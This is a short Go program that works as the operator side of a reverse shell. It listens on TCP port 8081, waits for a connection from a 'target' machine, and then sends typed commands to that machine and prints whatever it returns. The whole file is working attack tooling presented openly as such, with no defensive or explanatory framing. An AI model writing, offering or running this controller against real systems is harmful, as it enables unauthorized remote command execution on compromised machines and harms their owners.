package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

func main() {

	fmt.Println("waiting for incoming connection [-] ")
	fmt.Println("                                    ")
	//mention the port and the ip you want to serve on as net.Listen("tcp", "192.168.0.1:8081")
	ln, _ := net.Listen("tcp", ":8081")
	conn, _ := ln.Accept()
	if conn != nil {
		fmt.Println("Connected to the target [+] [+] [+] ")
	}
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Println("Enter The Command to execute : ")
		text, _ := reader.ReadString('\n')
		//Sending the command to the target machine
		conn.Write([]byte(text + "\n"))
		message := bufio.NewScanner(conn)
		go func() {
			for message.Scan() {
				line := message.Text()
				fmt.Println(line)
			}
		}()
	}
}
